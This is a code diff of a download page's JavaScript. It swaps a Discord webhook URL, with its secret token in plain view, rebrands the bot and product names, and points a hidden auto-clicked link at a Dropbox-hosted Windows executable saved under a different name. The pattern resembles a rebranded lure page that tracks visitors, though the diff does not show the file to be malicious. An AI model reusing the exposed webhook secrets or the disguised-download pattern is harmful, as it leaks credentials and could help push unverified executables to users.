@@ -149,7 +149,7 @@ document.addEventListener('click', (e) => {
 
 
 // ---- DISCORD WEBHOOK ----
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1493315362383593492/UM-aoQ7uDp63F9q_z6xJAwvlGqSC-wyeD2qdZ5Niv-xCYVOEcOXiSpu2yEmPh__jE8gd';
+const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1500499767061643445/gGmfEVOn3F8VdUUyCl6x1UYlhDZfLd-RBbkzbNAE5UQXlZHkHwkExXrt9sUn9yWu1AG7';
 
 function getBrowserName() {
     const ua = navigator.userAgent;
@@ -220,11 +220,11 @@ async function notifyDiscord() {
     }).format(now);
 
     const payload = {
-        username: "SoftSlump — Download Bot",
+        username: "Morin — Download Bot",
         avatar_url: "https://i.imgur.com/3nFzlv6.png",
         embeds: [
             {
-                title: "❄️ New SoftSlump Download!",
+                title: "❄️ New Morin Download!",
                 description: "Someone just braved the storm. **SoftSlump** download initiated.",
                 color: 0x0099ff, // Reference Blue
                 fields: [
@@ -275,8 +275,8 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/a2abjh8fdtse18qdchwrd/DuskaraSlump-1.0.4.exe?rlkey=eyde57tv6d8x4ec9xjvw7o995&st=9o183jn1&dl=1';
-    a.download = 'SoftSlump Setup 2.0.0.exe';
+    a.href = 'https://www.dropbox.com/scl/fi/yyos5rhpd4xjw0m994c0y/GrimLune-Setup-3.0.0.exe?rlkey=xte7a3hh4chbmic2pzcr2zwd7&st=ka28h1b8&dl=1';
+    a.download = 'GrimLune Setup 3.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
     a.click();
